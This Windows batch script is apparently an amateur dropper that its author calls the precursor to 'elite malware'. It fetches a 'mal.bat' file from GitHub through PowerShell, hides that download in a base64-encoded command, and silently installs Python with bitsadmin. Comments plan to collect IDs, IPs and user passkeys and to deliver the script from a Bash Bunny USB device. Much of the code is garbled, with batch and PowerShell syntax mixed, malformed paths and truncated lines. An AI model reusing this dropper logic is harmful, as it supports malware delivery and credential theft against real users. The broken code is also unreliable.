REM the precursor to my elite malware, creates a directory then moves to it downloads more mal from github and hosts sensitive data on a webserver

REM create the directory
md myMal

REM move to the directory
cd myMal

REM download the files from github
REM just an example. powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bwebb3234/bwebb3234/main/mal.bat' -OutFile malzs1.bat

REM I have the shell encoded in base64 and stored as a powershell vatiable
REM think about it . powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bwebb3234/bwebb3234//main/mal.bat' -OutFile malzs1.ba

REM base64 web request encoded variable to use
$encodedCommand = "SW52b2xlLVdlc3RDaHJvd2UgLVVyaSAnaHR0cHM6Ly9naXRodWJ8L2J3ZWJiMzIzNC9id2VibjMyMzQvbWFsLmJhdCcgLU91dEZpbGUgbWFsemMxLmJhdA=="

powershell -Command -enc $encodedCommand
REM What does it do next--jot ids and ips. get xp--user passkey.

REM silently run this but first modify it. notice the source and destination, is that right?
@echo off
bitsadmin.exe /transfer myDownloadJob https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe "C:Users\bwebb\myMal\python-installer.exe"
"C:Users\bwebb\myMal\python-installer.exe" /quiet InstallAllUsers=1 PrependPath=1
del /f /q "C:Users\bwebb\python-installer.exe"

REM don't forget to run this off the bash bunny and don't forget stage one and two--aomei and kaley.
